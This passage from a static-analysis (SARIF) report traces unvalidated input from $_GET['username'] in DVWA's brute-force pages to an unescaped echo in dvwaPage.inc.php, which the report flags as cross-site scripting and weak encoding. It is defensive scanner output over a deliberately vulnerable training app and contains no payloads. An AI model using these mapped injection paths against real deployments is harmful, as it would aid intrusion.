                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4676",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "C850B6F6AF6E1F449D60A3E1031CF35C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:21 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:21 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:21 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:21 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:21 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4691",
      "message" : {
        "text" : "In dvwaPage.inc.php, the program uses HTML, XML, or other types of encoding that is not always enough to prevent malicious code from reaching the web browser.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "DAA62F9AFB6AB3BDF495EB2960B6FDEF"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
